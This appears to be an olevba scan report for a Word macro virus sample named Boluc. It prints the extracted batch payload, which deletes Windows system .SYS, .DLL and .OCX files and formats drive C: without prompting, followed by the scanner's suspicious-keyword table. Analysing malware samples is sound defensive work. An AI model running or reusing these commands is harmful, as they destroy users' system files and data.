olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Boluc-e0c14b33430625e1ba0875678e0b216b9f4e7186
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Boluc-e0c14b33430625e1ba0875678e0b216b9f4e7186 
in file: Virus.MSWord.Boluc-e0c14b33430625e1ba0875678e0b216b9f4e7186 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@echo off
DEL C:\WINDOWS\SYSTEM\*.SYS
DEL C:\WINDOWS\SYSTEM\*.DLL
DEL C:\WINDOWS\SYSTEM\*.OCX
CLS
FORMAT C: /u /v:HERCOLUBUS /autotest
if not errorlevel 0 goto FORMAT_ERROR
CLS
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

